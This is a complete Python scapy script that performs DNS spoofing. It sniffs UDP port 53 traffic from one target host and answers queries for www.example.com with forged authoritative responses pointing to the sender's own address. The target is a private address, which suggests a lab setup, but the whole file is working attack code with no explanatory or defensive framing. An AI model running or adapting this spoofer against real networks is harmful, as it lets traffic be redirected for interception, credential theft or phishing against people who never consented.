from scapy.all import *
from scapy.all import DNS, IP, UDP, DNSRR, DNSQR

TARGET_IP = "10.42.0.174"
INTERFACE = "wlp0s20f3"

target_qname = b"www.example.com."  # The DNS name to spoof
spoof_ip = get_if_addr(INTERFACE)  # The IP address to respond to the DNS query with (right now it is our own IP)

def dnf_spoof(packet):
    # Check if packet has IP, UDP, and DNS layers
    if packet.haslayer(IP) and packet.haslayer(UDP) and packet.haslayer(DNS):

        # Check if it's a DNS query (qr=0 means query, not response)
        # Return if the request is not from the target
        if packet[IP].src != TARGET_IP:
            return
        
        # Return if the packet is not a DNS query
        if packet[DNS].qr != 0:
            return

        # Get the name that is being queried
        qname = packet[DNSQR].qname
        
        print(f"DNS Query from {packet[IP].src}: {qname.decode()}")
        # Return if the query is not for the target name 
        if target_qname != qname:
            return

        # Build a response to the DNS query and send it
        print(f"Sending DNS response to {packet[IP].src} for {qname}...")
        ip  = IP(dst=packet[IP].src,  src=packet[IP].dst)
        udp = UDP(dport=packet[UDP].sport, sport=53)
        dns = DNS(
            id=packet[DNS].id,
            qr=1, aa=1, rd=packet[DNS].rd, ra=1,   # mirror RD, set RA
            qd=packet[DNS].qd,
            an=DNSRR(rrname=qname, ttl=120, type="A", rdata=spoof_ip),
            ancount=1
        )

        send(ip/udp/dns, verbose=False)          # raw socket; root needed


# Sniff only UDP packets on port 53 (DNS)
print(f"Listening for DNS queries from {TARGET_IP}...")
sniff(
    iface=INTERFACE,
    filter="udp port 53",
    prn=dnf_spoof,
    store=0
)